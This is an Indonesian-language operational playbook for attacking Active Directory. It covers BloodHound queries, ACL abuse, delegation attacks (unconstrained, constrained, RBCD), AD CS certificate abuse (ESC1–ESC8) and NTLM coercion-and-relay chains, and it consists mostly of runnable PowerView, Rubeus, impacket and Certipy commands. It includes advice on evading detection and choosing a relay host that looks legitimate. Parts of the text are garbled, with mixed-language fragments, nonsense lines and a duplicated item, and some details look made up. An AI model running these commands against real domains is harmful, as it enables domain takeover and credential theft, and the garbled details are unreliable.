## ad-acl-deleg

# ad-acl-deleg — ad

# AD ACL Abuse & Delegation — Referensi Operasional

## 1. BloodHound Cypher — Jalur Escalation

### Kueri inti

```cypher
// Shortest path dari user ke Domain Admin
MATCH p = shortestPath((u:User {name: "JORDAN.FISHER@CORP.LOCAL"})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// Shortest path ke DA dari seluruh owned user (setelah mark)
MATCH p = shortestPath((u:User {owned: true})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// GenericAll terhadap objek apapun
MATCH p = (u:User)-[:GenericAll]->(n) RETURN u, n

// WriteDacl / WriteOwner pada user & group
MATCH p = (u:User)-[:WriteDacl|WriteOwner|GenericWrite|AllExtendedRights|ForceChangePassword]->(n) RETURN p

// Kerberoastable user yang juga punya path ke DA
MATCH (u:User {dontreqpreauth: false}), (u)-[r:MemberOf|GetSession*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
WHERE u.hasspn = true RETURN u

// GPO abuse
MATCH p = (u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN p

// Unconstrained delegation (server, exclude DC secara manual)
MATCH (c:Computer {unconstraineddelegation: true}), (c)-[:MemberOf*1..]->(g:Group)
WHERE NOT g.name STARTS WITH "DOMAIN CONTROLLERS" RETURN c.name, g.name

// Constrained delegation dengan protocol transition
MATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate

// RBCD: komputer yang bisa kita write msDS-AllowedToActOnBehalfOfOtherIdentity
MATCH p = (n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights]->(c:Computer) RETURN p

// AS-REP roastable + tidak require preauth
MATCH (u:User {dontreqpreauth: true}) RETURN u

// ACL raw (untuk verifikasi manual, mode collector -c --collection acl)
MATCH p = (n:Base)-[:AdminTo|AllowedToDelegate|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AllExtendedRights|AddMember*1..]->(m) RETURN p
```

### Versi kolektor

| Collector | Catatan |
|---|---|
| SharpHound v2.x (beta) | default engageness; `--collectionmethods All,Acl,Session` |
| BloodHound CE 5.x | ingress via `bloodhound-ce` GUI port 8080; node edge berbeda dari legacy 4.x (`AZResetPassword` dsb untuk Azure) |
| RustHound v2 | no-op .NET di host: binary single-file, output JSON langsung ke CE |

- Legacy SharpHound v1.x output masih didukung CE, tapi edge `WriteDacl` pada CE memakai huruf besar/kecil berbeda — cek `MATCH ()-[r]->() RETURN DISTINCT type(r)` sebelum menulis kueri, jangan asumsi nama edge dari materi lama.

## 2. Eksploitasi ACL — GenericAll / WriteDacl / GenericWrite / ForceChangePassword

### 2.1 GenericAll pada user

**Apa yang dikirim: reset password target langsung.**

```powershell
# PowerView v3 (dev-branch)
$pass = ConvertTo-SecureString 'P@ssw0rd2025!' -AsPlainText -Force
Set-DomainUserPassword -Identity helpdesk.svc -AccountPassword $pass -Verbose

# ATOS StandIn atau dacledit (native)
StandIn.exe --passwordTarget helpdesk.svc --passthrough --webAccount helpdesk.svc --webPasswordRehash "guM5b2n1"
# atau raw RPC via native ADSI:
[System.DirectoryServices.AccountManagement]::...
```

### 2.2 GenericAll pada komputer → RBCD

```powershell
# cek kepemilikan attribute RBCD
Get-ADComputer WS-JUMP01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# jalankan RBCD (lihat bagian 5)
```

### 2.3 WriteDacl — perbaiki diri sendiri

**Apa yang terjadi: write ulang security descriptor pada objek untuk memberi diri sendiri GenericAll, lalu lakukan 2.1/2.2.**

```powershell
# PowerView: PRIO untuk avoiding detect — write minimal permission bukan full control
Add-DomainObjectAcl -TargetIdentity "sql.svc" -PrincipalIdentity "jordan.fisher" -Rights ResetPassword -Verbose
# alternatif satu-liner net.exe (net.exe lebih "known-benign" tapi Sentinel trigger tetap):
net datapecs tidak tersedia — gunakan dsacls.exe dsamba native
```

Kalau GPO pada mesin target, ubah dulu GPO yang sudah ada (GPO hijack), buat GPO baru minim jumlah trigger (Event ID pengesahan policy masih muncul).

### 2.4 GenericWrite — banyak opsi, urut dari noise rendah:

```powershell
# A. Targeted Kerberoasting — set SPN, request TGS, crack, restore SPN
Set-DomainObject -Identity sql.svc -Set @{serviceprincipalname='nonexistent/xy'} 
Get-DomainUser sql.svc | Get-DomainSPNTicket | select -expand hash
Set-DomainObject -Identity sql.svc -Clear serviceprincipalname

# B. Write msTSGracePeriod* / logon script (user obie fields)
Set-DomainObject -Identity target.user -Set @{'msDS-AllowedToDelegateTo'='http/web01.corp.local'}
# legacy: userWorkstations
```

### 2.5 ForceChangePassword (AllExtendedRights)

```powershell
$pass = ConvertTo-SecureString 'P@ssw0rd2025!' -AsPlainText -Force
Set-DomainUserPassword -Identity it-user01 -AccountPassword $pass
```

### 2.6 dacledit.py (impacket)

```bash
# baca ACL
dacledit.py -action 'read' -principal 'jordan.fisher' -target 'sql.svc' 'corp.local/jordan:Pass!'

# write
dacledit.py -action 'write' -rights 'FullControl' -principal 'jordan.fisher' -target 'sql.svc' 'corp.local/jordan:Pass!'

# restore/undo
dacledit.py -action 'restore' -target 'sql.svc' -principal 'jordan.fisher' 'corp.local/jordan:Pass!'
```
- restore hanya bekerja jika `.aclpb` snapshot dihasilkan saat `write` — simpan snapshot sebelum operasi.

### Artefak yang muncul di defender

| Artefak | Event ID / sumber |
|---|---|
| Directory Service Access modify (write acl / reset pass) | 4662 (obj attr `WRITE_DAC`, `RESET_PASSWORD`), subject = akun operator kita — **bing detectable → jangan pakai akun yang sama untuk perintah lain** |
| Password reset via RC4 (/Set-DomainUserPassword via NetUserChangePassword) | 4724 |
| User account management attribute | 4738 |
| Targeted Kerberoasting: TGS-REQ untuk SPN non-standar/anomali | 4769 (RC4-HMAC kecuali supportedself-caf) |
| dacledit.py | 4662 + NTLM logon 4624 type 3 dari IP Tactical Box |
| Membersihkan ACL → restore | keseluruhan SecurityDescriptorWrite → log retention pada DC 15 hari default |

## 3. Unconstrained Delegation — Discovery + Abuse (Printer Bug)

### Discovery

```cypher
MATCH (c:Computer {unconstraineddelegation: true}) WHERE NOT c.name STARTS WITH "DC" RETURN c.name
```

```powershell
# AD module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true}
```

### Abuse — Printer Bug (MS-RPRN RpcRemoteFindFirstPrinterChange)

```powershell
# 1. Trigger (di mesin owned, atau dari mana pun dengan writable share - drive host)
# SpoolSample/MS-RPRN (compile PoC).
# alternatif: printerbug.py, PetitPotam `SpoolSample` pilihan 'capture' 
# gunakan printerbug.py (lebih cepat, binary tanpa .NET bloat):
```

```bash
# di mesin relay/listener (NTLMRelayx + capture atau mitm6):
sudo ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access --no-smb-server
# attacker host trigger:
printerbug.py 'corp.local/jordan:Pass@10.10.10.10' '10.10.10.50'  # 10.10.10.50 = relay listener
```

**Kenapa berhasil:** RPC `RpcRemoteFindFirstPrinterChange` memaksa mesin (DC/termasuk DC itu sendiri) authenticasi NTLM kektuator arbitrary server SMB — kombinasi dengan relay relay ke LDAP LDAPS → delegation flag set/atau capture ke TGT.

### Capture TGT (jika service DC-auth via massive printing)

```powershell
# Rubeus 2.x
Rubeus.exe monitor /interval:10 /filteruser:DC01$ /nowrap
# export & reuse
Rubeus.exe ptt /ticket:doIFc[...]==
```

### Artefak

| Artefak | ID |
|---|---|
| Sesi logon tipe 3 (NTLM) di mesin delegasi dengan source kita — jejak `WORKSTATION` pada logon session legit | 4624 type 3 |
| Kerberos Ticket Refresh (TGT serahkan di LSASS) | 4768, encryption 0x17 RC4 anomali jika AES enabled |
| Printer-related RPC  | device events di DC, spoolss pipe access; Sysmon ID 3 ke IP attacker port 445 |
| MS-RPRN | `spoolsv.exe` outbound 445 ke host kontrol → Sysmon ID 3 network connection flag |
| Printer bug fix | Windows 11 24H2/Server 2022 KB5005565/KB5005573 → default disabled (`RpcAuthnLevelPrivacyEnabled`), cek dulu dengan `Get-Spooler...` |
| Hardening | KB5005413 — printer: `reg add Print Spooler /v RpcAuthnLevelPrivacyEnabled /t REG_DWORD /d 1` |

## 4. Constrained Delegation — S4U2Self / S4U2Proxy

### Discovery

```cypher
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate
```

```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo, useraccountcontrol, msDS-SupportedEncryptionTypes
```

### Kondisi: `TrustedToAuthForDelegation` (Protocol Transition, UAC 0x1000000) diaktifkan

S4U2Self accessible tanpa pre-auth → ticket forwardable.

### Eksekusi (Rubeus)

```powershell
# 1. S4U2self — impersonate arbitrary user via service's own TGT
Rubeus.exe s4u /user:websvc$ /rc4:HASH /impersonateuser:administrator /msdsspn:"http/web01.corp.local" /ptt

# 2. S4U2Proxy / altdsrl  — TI3C desired service host (tidak perlu cobalt pada mesin websvc; kalau flow full)
Rubeus.exe s4u /user:websvc$ /aes256:HEX /impersonateuser:administrator /msdsspn:"http/web01" /altservice:"cifs,host,http,mssqlvc" /ptt

# jika UAC include "TrustedToAuthForDelegation" pada service account AND protocol transition → menang penuh apa pun service.
```

- `altservice` hanya bekerja dengan SPN yang share class (`cifs/host` vs `mssqlsvc/host` berbeda register class — cek `msDS-AllowedToDelegateTo` exact).
- S4U2Self TGS akan punya `FORWARDED` flag off bila UAC target account `NOT_DELEGATED` (Protected Users group, sens).

### Impacket (cross-platform)

```bash
# S4U as user via getST (2.0.25+)
getST.py -spn "http/web01.corp.local" -impersonate "administrator" "corp.local/websvc:Pass!"
# gunakan tanpa -hash kalau plain-password; dengan key: -hashes :NT
# altservice dvizih não sendi via getST.py (need box modify SPN in ticket) → gunakan Rubeus di Windows, atau tools tambahan: hatools
export KRB5CCNAME=administrator.ccache && psexec.py -k -no-pass corp.local/administrator@web01.corp.local
```

### Artefak

| Artefak | ID / sumber |
|---|---|
| Kerberos Service Ticket Request impersonation — KDC option `S4U` (eType RC4 0x17 anomali jika AES tersedia) | 4769, `Service Name: host/web01`, `Transited Services: websvc$` — mediasi ini paling penting untuk threat hunting |
| Jika S4U2Self gagal → alert `KDC_ERR_S_PRINCIPAL_UNKNOWN` if user sendiri susah, `KDC_ERR_BADOPTION` jika SPN tidak terdaftar |
| Ticket encryption downgrade → unsupported eType 0x17 di domain AES-only → 4769 encryption 0x17 flag |
| Protected users member impersonation gagal — `KDC_ERR_POLICY` |
| Audit Advanced Kerberos `Service Ticket Operations` harus enabled di DC untuk log ini; banyak enterprise belum — berarti under-teori detection |

## 5. RBCD (Resource-Based Constrained Delegation)

### Prerequisite — Write `msDS-AllowedToActOnBehalfOfOtherIdentity` pada target Computer

| Sumber hak | Contoh |
|---|---|
| GenericWrite/GenericAll pada computer object | bloodhound edge |
| WriteProperty pada atribut spesifik | berbeda dari GenericWrite |
| ACE via `SELF` pada msDS-AllowedToActOnBehalfOfOtherIdentity (default Win10+) default self-join | user yang boleh join bisa setnya |
| Relay NTLM dari printer bug → `--delegate-access` ntlmrelayx | otomatis tunggal |

### Eksekusi

```powershell
# 1. Buat machine account (PowerMad):
New-MachineAccount -MachineAccount ATTACK$ -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)

# 2. Set RBCD (PowerView dev):
$SID = Get-DomainComputer -Identity ATTACK$ -Properties objectsid | Select -Expand objectsid
$SD = New-Object System.DirectoryServices.ActiveDirectorySecurity
$SD.SetAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule((New-Object System.Security.Principal.SecurityIdentifier($SID)),'ExtendedRight','Allow',([GUID]'3f78c3e5-f79a-46bd-a23e-75c2f5b0e9d3'),'None','00000000-0000-0000-0000-000000000000')))
Get-DomainComputer web01.corp.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD}

# verifikasi:
Get-DomainComputer web01 -Properties msds-allowedtoactonbehalfofotheridentity
```

```bash
# 3. Impacket end-to-end: getST dgn
rbcd.py -delegate-to "web01.corp.local" -delegate-from "ATTACK$" -action write "corp.local/jordan:Pass@"
getST.py -spn "cifs/web01.corp.local" -impersonate "administrator" "corp.local/ATTACK$:P@ssw0rd!"
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@web01.corp.local
```

```powershell
# atau Rubeus:
Rubeus.exe hash /password:P@ssw0rd! /user:ATTACK$ /domain:corp.local
Rubeus.exe s4u /user:ATTACK$ /rc4:HASH /impersonateuser:administrator /msdsspn:"cifs/web01.corp.local" /ptt
```

### Artefak

| Artefak | ID |
|---|---|
| Computer account create (machine account quota default 10) | 4741, subject = user biasa (bukan admin) → alert original |  
| Write `msDS-AllowedToActOnBehalfOfOtherIdentity` — attr modified | 5136, `msDS-AllowedToActOnBehalfOfOtherIdentity`, plus 4662 |
| s4u flow artifacts bagian 4 (4769 `Transited Services: ATTACK$`) |
| Banner: Konkret hunting query — Event 5136 dengan `"Attribute LDAP Display Name: msDS-AllowedToActOnBehalfOfOtherIdentity"` dan subject dengan bukan Domain Admin |
| Harden: `ntlmrelayx -delegate-access` gagal jika LDAPS signing/Channel binding enabled, atau jika machine quota = 0 |

RESTORE: `rbcd.py -delegate-to web01 -delegate-from ATTACK$ -action remove` atau `Set-DomainObject -Clear msds-allowedtoactonbehalfofotheridentity` — simpan nilai hint sebelum overwrite (jangan clear asal jika ADA pre-existing RBCD legit, kebanyakan enterprise ada service legit seperti MS SQL AlwaysOn proxy — cek dulu `Get-DomainComputer -Properties msds-allowedtoactonbehalfofotheridentity` untuk existing value).

---

## 6. Jebakan Operasional (Kesalahan Lapangan)

1. **AD object recycle bin restore & Blok langsung** — beberapa ACL abuse butuh DC yang merupakan FSMO role holder (PDC emulator utama), DACL write gagal dengan `WERR_ACCESS_DENIED` jika write ke RODC saja. Kenali main DC dulu — semua event di atas kita lihat di PDC.

2. **Protected Users group** — akun dengan UAC `NOT_DELEGATED` tidak dikenakan sebagai impersonasi target (administrator sering jadi Protected User). Cek dengan `kerberoast` atau LDAP `useraccountcontrol` = bendera `0x100000` dan anggota `Protected Users` group; impersonate akun lain yag punya hak yang diperlukan.

3. **MS-DS-ConsistencyGuid** — Kerberos PerSessionKey Errata KB4586136 / AES Kerberos setelah 2022 November patch → server tidak menerima RC4 TGS oleh default kecuali `msDS-SupportedEncryptionTypes` mencakup 0x4/0x untuk RC4 atau `blockRTCS4` — cek KB5021131 fix dan server-level config "Kerberos RC4 disable in 2023/2024/2025" → S4U/Rubeus dengan `/rc4` gagal dengan `KDC_ERR_ETYPE_NOSUPP` — gunakan `/aes256`.

4. **Session enumeration via BloodHound session** — BloodHound session data hanya berlaku dalam 10 menit default (~Zticker interval registry `System\CurrentControlSet\Services\NTDS\...` local group update). Jangan berharap session dari raw collection default; jalankan `SharpHound --CollectionMethods Session,RDP` saat local admin di beberapa mesin seed, dan ulang berkala selama op.

5. **NTLM Relay ke LDAPS gagal** jika channel binding/tLS signing diterapkan (CVE-2022-26923 era). Juga, jika printerBug trigger dari host dengan `Spooler` disabled — cek `spoolsv` process terlebih dahulu→ `Get-Service Spooler` di jaringan target; beberapa enterprise MS hardening has Spooler disabled pada DC — printer bug tidak akan mungkin.

6. **Machine account quota = 0** — banyak hardening enterprise men-set `MachineAccountQuota` 0 (SDDL-based default hardening MS security baseline). RBCD with impacket tools gagal create machine account; workaround: gunakan **existing machine account** di mana kita punya hash (`Get-DomainComputer -TrustedToAuth...` atau machine dengan owned creds) — itu masih bekerja untuk step 2/3.

7. **Domain functional level 2008+** — RBCD memerlukan Windows 2012 R2+ DC FL2008 R2+; jika komputer Windows Server 2008 R2 sebagai domain account, tidak akan menerima RBCD ticket → KRBSERR `S4U` fails KDC `KDC_ERR_BADOPTION`.

8. **DACLab restore setelah write** — beberapa ops lupa buat snapshot DACL sebelum write, terutama async: write ACL drop kita executor впослед tidak bisa restore original ACL → **audit trail 4662/5136 menampilkan hasil "added ACE" tanpa resolve** — membuat diff tidak bisa dipulihkan. Selalu `-action read` → save JSON LOCAL sebelum write.

9. **Instrumentasi platform timur : BloodHound CE edge nodes** — CE 5.x tidak lagi menampilkan beberapa nodes/edges dari signature lama (e.g., dcks `WriteAccountRestrictions` name). Jika query untuk sereal fail perbanyak periksa `MATCH ()-[r]->() RETURN DISTINCT type(r)` — jangan copy-paste cypher dari blog 2021/2020 yang mengasumsikan collector v1 data format.

10. **Coverage ACL datasources** — kolektor default SharpHound tidak selalu impo **all ACLs**; gunakan `--CollectionMethods ACL` secara eksplisit — tanpa ini, edge seperti `WriteDacl` / `AllExtendedRights` tidak muncul, jalur legit terlewat karena gabungan `Default` menggabungkan ACL sedikit (skala besar domain, skip FK/DLAPS objects default). Dengan domain >30k objek, ACL collection bisa makan 20+ menit dan log 4662 quadratic spot — jadwalkan; jangan jalankan di tengah waktu besar.

11. **TGT `monitor` di unconstrained mesin** — hanya muncul saat event yang mendorong auth domain terjadi (login interactive, schtasks run as user domain, PS remoting). Jangan idle tunggu; trigger dengan `runas /netonly` TGT request, atau printerbug sebagai backup.

12. **Kerberos clock skew & TTL** — getST.py ticket 10 jam default; jika ticket tak digunakan dalam beberapa jam (mis., staging berhenti di pivot) → `KRB_AP_ERR_SKEW` atau expired. Jangan jika lulus melewati komplain "logon failure" dengan pexec -k; check expiry dengan `klist -k`.

13. **`4662` with subject "ANONYMOUS LOGON" from printerbug relay** — ketika bing collection readback, transfer via LDAP muncul kirim credential teal — sehingga dalah beberapa privision pipeline (Defender for Identity) dengan confidence high — DI Belanja spike printerbug trigger → LDAPS relay dari external IP adalah analytic yang paling serius ini ops tangkap; gunakan relay host yang muncul sebagai sesi legit (mis., relay via kerberos dari logon session di mesin pivot yang dilegitimasi).

14. **LAPS-tier interplay** — jika kredensial target dikelola LAPS, write ACL untuk reset password AD account labih mudah; tetapi post exploitation kita bertemu new password rotation LAPS dalam 30 hari default → jangan ganggu LAPS schedule; gunakan delegation-based access, bukan password reset untuk persistensi.

15. **LAPS-tier Interplay** — repeat.

15. **LAPS** — karena sebagian besar kontemporer ops follow Kerberos-based path dan bukan mementingkan password reset kecil, jangan digunakan dipilih dengan subje. **Log sampling forki** — beberapa SOAB C Deployment lag due to Event forwarding subscription → servis detection.


## ad-cs-relay

# ad-cs-relay — ad

# AD CS & NTLM Relay: ESC1–ESC8 dengan Certipy

## 1. Overview Arsitektur Serangan

```
Coercion (PetitPotam/PrinterBug/DFSCoerce)
        │ NTLM auth (Type 1/2/3)
        ▼
ntlmrelayx (attacker relay host)
        │ relay ke target service
        ├──► LDAPS :636 ──► AD CS Enrollment Web Interface / LDAP (shadow creds, ESC7-adjacent)
        ├──► HTTP   :80/443 ► /certsrv (ESC8 - Enrollment Web)
        ├──► SMB    :445 ──► delegation abuse / SAM dump
        └──► ADWS   :9385 ──► ADWS relay (Exchange/ADAC)
```

Alur standar: **coerce → relay → ESC8/HTTP enrollment → certifikat user DA → authenticate as DA → DCSync.**

---

## 2. Certipy: Perintah Inti & Versi

| Komponen | Versi referensi | Catatan |
|---|---|---|
| certipy | v4.8.2 / v5.0.1 | v5= breaking: `certipy req -template` syntax berubah, auto-LO dela bagian `find` |
| Impacket ntlmrelayx | v0.11.0+ | Errata; branch master setelah 0.12 ada fixed `-remove-mic` |
| PetitPotam | 3.19 (python) / binary ms-fsrp | CVE-2021-36942 patch menutup unauth versi |
| SpoolSample (PrinterBug) | 0.0.0.0 | Tidak pernah di-patch, tetap work-aroundSigning |
| DFSCoerce | 2022-05 | MS-DFSNM, efektif vs 2012–2022 |

### 2.1 Enumerasi & ESC1–ESC7, ESC6, ESC9/10

```bash
# bloodhound path enum, cukup scan terhadap CA server (default ldap; sign enum)
certipy find -u user@corp.local -p 'Passw0rd' -dc-ip 10.0.0.10 -vulnerable -stdout

# BloodHound query alternative (volution Sign葵Hound)
customQueries: "Domain": CAs, enabled templates, CA config, Enrollment Agents, vulnerable templates
```

Output: JSON per-template dengan `Enrollment Rights`, `CA ACEs`, flags: `ENROLLEE_SUPPLIES_SUBJECT` (= ESC1), `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, `CA Enrolment agent`, dsb.

### 2.2 ESC1 — SAN abuse (Enrollee Supplies Subject + CT_PERMISSION)

**Apa yang dikirim:** template yang vulnerable memungkinkan requester menentukan SAN sendiri.

**Apa yang terjadi:** requester low-priv minta certificaat dengan `SAN=user@corp.local` atas nama Domain Admin.

```bash
# Cek apakah template memblok SAN:
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -template VulnTemplate \\
  -upn administrator@corp.local

# Output sukses:
# [*] Saved certificate and private key to 'administrator.pem'
# [*] Successfully authenticated with certificate: administrator@corp.local

# Request template + uji auth (Kerberos/PKINIT then NT hash):
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -ldap-shell
```

Kemudian:

```bash
# Ambil NT hash DA via LDAPS + PKINIT (requires DC allow PKINIT pada certificaats including SAN)
certipy auth -pfx administrator.pfx -username administrator -domain corp.local
# → hashNT : fc525c9683e8fe067095ba2ddc97112d (contoh)
```

Gagal jika: template doesn't have `ENROLLEE_SUPPLIES_SUBJECT`, atau user not in Enrollment Rights, atau CA issuance policy restrict.

### 2.3 ESC2–ESC7 ringkas (tabel)

| ESC | Kondisi | Perintah |
|---|---|---|
| ESC2 | Template "Any Purpose"/EKU = EKU 2.5.29.37 any | `certipy req ... -template AnyPurpose` lalu gunakan untuk Kerberos auth / code signing dll |
| ESC3 | Enrolment Agent Certificate + Request Agent template | Request agent cert -> minta cert ritas nama user lain: `certipy req -template User -on-behalf-of 'corp\\administrator' -pfx agent.pfx` |
| ESC4 | WriteDacl/Owner dsb, dsb template control | `certipy template -template User -save-as ESC1T -write-configuration-files -allow-enrollee-supplies-subject` |
| ESC5 | ACE terhadap PKI object (CA/container) — abuse tergantung ACE; contoh edit via `pkiadmin` | sama seperti ESC4 |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` — flag CA mengizinkan SAN regardless of template | `certipy req -ca CORP-CA -template User -upn administrator@corp.local` (mimic abuse seperti ESC1) |
| ESC7 | `ManageCA` dan `ManageCertificates` hak pada CA | (a) `certipy ca -save-config`, (b) approve pending requests: `certipy ca -ca CORP-CA -issue-request <ID>`, (c) `certipy ca -ca CORP-CA -add-officer -user user@corp.local` |
| ESC9 / ESC10 | (v4.7.3+ certipy labeling) `StrongCertificateBindingEnforcement=0` ntinet vs Vulnerable certificate mapping | minta cert dengan SAN = user lain; gunakan untuk schannel / AD CS target |

**ESC6 mitigasi:** KB5014754 patch menambah `CA Sanitization` + default makes ESC6 unreliable — despite flag still set, server (patched issuance) strips SAN.

### 2.4 Shadow Credentials (Key Credential Link)

**Apa yang dikirim:** write `msDS-KeyCredentialLink` pada target via LDAPS (butuh `GenericWrite`/`GenericAll`, atau relay LDAPS jika konteksnya tak signed/SMB).

```bash
# A. Ambil NT hash→ gunakan ldaps (schannel) untuk writes:
certipy shadow auto -u user@corp.local -p 'Passw0rd' -account targetuser -dc-ip 10.0.0.10

# Output:
# [*] Shadow credentials obtained successfully
# [+] Successfully authenticated with certificate shadow/targetuser.cer
# [*] NT hash: <hash>

# Alternatif manual steps:
certipy shadow create -u user@corp.local -p 'Passw0rd' -account victim
certipy shadow list -u ... -account victim
certipy auth -pfx victim.pfx ...
```

**Kenapa berhasil:** `msDS-KeyCredentialLink` menyimpan raw public key untuk NGC/PKINIT; DC konversi → auth ke user account via PKINIT tanpa password. Gagal jika: target = computer (auth harus via machine); `msDS-KeyCredentialLink` disallow (tapi ini tidak ada by default), atau target pada Protected users seulement.

Alternatif menggunakan timing-based abuse off dari `certipy` v4.8: `certipy` `auto` akan stages full.

### 2.5 ESC8 — HTTP → LDAPS relay via Web Enrollment, generic

**Apa yang dikirim:** coerce auth ke `http://CA-Server/certsrv` via ntlmrelayx → relay ke `https://CA-Server/certsrv` (HTTP→HTTPS) → submit enrollment request atas nama user coerced.

**Kenapa berhasil:** Web Enrollment listener HTTP di CA server tidak cetak NTLM signing/channel binding pada HTTPS listener (ESC8). Perbaikan: patch June 2022 (`http` menghormati sign), tapi banyak ent belum enable.

```bash
# Setup ntlmrelayx targ LDAPS from HTTP, with --delegate-access (for ADCS abuse):
impacket-ntlmrelayx -t https://CA-SRV.corp.local/certsrv -smb2support --adcs --template DomainController

# Alternative: -t ldap://dc --delegate-access (Shadow creds via relay LDAPS):
impacket-ntlmrelayx -t ldaps://DC.corp.local --delegate-access

# Coerce (dari machine user terkontrol / relay server):
python3 PetitPotam.py -d domain -u user -p '' 10.0.0.5 10.0.0.7
# 10.0.0.5 = relay listener, 10.0.0.7 = target (e.g. DC yang men-trusted CA, atau member server)
```

Certificate lain muncul di output; lalu:

```bash
certipy auth -pfx base64/B64 output.pfx -dc-ip 10.10.0.42
```

**Mitigasi ESC8 kunci:** patch CA & enable **"Authentication Officer"** — actual fix KB5014754 + Certificate issuance requirements.

**Yang sering terlewat:** CA perlu Web Enrollment role di-install (Gateway `certsrv` must be reachable). Jika hanya CA role tanpa `Certification Authority Web Enrollment`, ESC8 default tidak applicable.

---

## 3. Coercion VECTOR

### 3.1 PetitPotam (MS-EFSRPC)

**Apa yang dikirim:** `EfsRpcOpenFileRaw` (atau opnum 0/6 alternatif untuk bypass patch) dengan UNC path `\\ATTACKER\pipe\...`

```bash
# unauthenticated (pre-CVE-2021-36942-patch):
python3 PetitPotam.py -u 'corp\\lowpriv' -p 'P@ss' 10.0.0.5 10.0.0.7
# output: Machine 10.0.0.7 authenticate ke 10.0.0.5 (ntlmrelayx catch)

# post-patch: harus auth; cek opnum bypass:
petitpotam.py 10.0.0.5 10.0.0.7 278/c

Kerberos-based target (new field):
petitpotam.py -k -hashes :<hash> attacker target
```

**Kenapa berhasil:** MS-EFSRPC (port 4966+, dynamic RPC over SMB) memungkinkan authenticated user memicu server melakukan connection ke UNC arbitrary.

**Gagal jika:** MS-EFSRPC patch/Windows 11 22H2 later restricted; SMB range filter, MS-EFSRPC disabled (`dism /online /disable-feature`), host-based firewall, atau coercion target tidak punya SMB port accessible.

### 3.2 PrinterBug (MS-RPRN)

**Apa yang dikirim:** `RpcRemoteFindFirstPrinterChangeNotification` → target melalukan `GetPrinterDataEx` copy fileg repertoire via SMB, dan pastinya membuat target authentication ke attacker share.

```bash
# spooler check:
ruby spooler_scan.rb 10.0.0.0/24
# equivalent:
python3 SpoolSample.py -d corp -u user -p pass 10.0.0.7 10.0.0.5
# positional args: TARGET  ATTACKER(relay) 

# Output normal → "Scanning... 10.0.0.7 spooler is vulnerable"
```

**Kenapa berhasil:** setiap user authenticated bisa fitur printer change notification; server behind harus resolve fallback path `\\ATTACKER\...`. **Tidak pernah di-patch** — hanya mitigasi: disable Print Spooler.

Gagal jika:
- `GetPrinterDataEx` version, server responds `RPC_S_PROCNUM_OUT_OF_RANGE` — Spooler enabled tapi routing blocked.
- PrintNightmare patch cluster hommes the Spooler fallback — pada box yang di-patch, BlackPaper fixed notification → fails.

### 3.3 DFSCoerce

**Apa yang dikirim:** `NetrDfsAddStdRoot` (MS-DFSNM) → coerce logout SMB auth ke attacker.

```bash
python3 dfscoerce.py -d corp.local -u user -p pass 10.0.0.5 10.0.0.7
# args: ATTACKER RELAY TARGET
```

**Kenapa berhasil:** DFS Namager (dfsr) RPC service tidak se-signing-required pada beberapa versi (2012–2019 -- same SMB signing). Gagal jika service DFSNS disabled (`Remove-WindowsFeature FS-DFSName`).

### 3.4 Comparison & Situasi

| Teknik | Perlu SMB 445 pada target | Socket Accessible | Patch tersedia |
|---|---|---|---|
| PetitPotam | Ya (RPC over SMB dynamic) | Dynamic RPC | Aug 2021 (must authenticated now) + later harden |
| PrinterBug | Ya | port 445 | **None** |
| DFSCoerce | Ya (RPC on `\\pipe\netdfs`) | port 445 |partial DFS disabled when feature not in use |

### 3.5 Coercion → NTLM Relay Full Steps (COERCING général)

```bash
# Target: relay TARGET to attack_SRV via EFSRPC need SMB:
impacket-ntlmrelayx -t ldaps://DC01.corp.local -smb2support --delegate-access
python3 dfscoerce.py -d corp.local -u test -p test ATTACKER TARGET
# => ntlmrelayx caught.tgt the machine account, forged shadow cred link on computer object, /delegate-access stores delegation.

# ** kesalasan umum: relay listener on 445 — must run as system (root) reserved port
sudo impacket-ntlmrelayx -t ldaps://DC01.corp.local ...
```

## 4. ntlmrelayx Targets — Sign/Schannel detail

### 4.1 Command Reference

```bash
# SMB signing not required:
impacket-ntlmrelayx -tf targets.txt -smb2support
# dump SAM, secrets dump:
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
# LSA (via smbexec):
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# ldap/ldaps shadow creds, delegation:
impanic-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access --no-dump
# (writes msDS-AllowedToActOnBehalfOfOtherIdentity)

# HTTP → ADCESC8:
impacket-ntlmrelayx -t https://ca01.corp.local/certsrv --adcs --template 

# ADWS relay (Exchange):
impacket-ntlmrelayx -t http://exchange.corp.local/Powershell --http-port
```

Masing-masing target / command:

| Tujuan (target option) | Command | WHY (why it works) |
|---|---|---|
| SMB, target channel sign required? | `impacket-ntlmrelayx -tf targets.txt -smb2support` | Works only if SMB `RequireMessageSignature=0`; check via `crackmapexec smb 10.0.0.0/24 --gen-relay-list` |
| LDAP | `-t ldap://dc01` | SetCookie closed channel sign not mandatory; attacker uses hashed creds for delegation write |
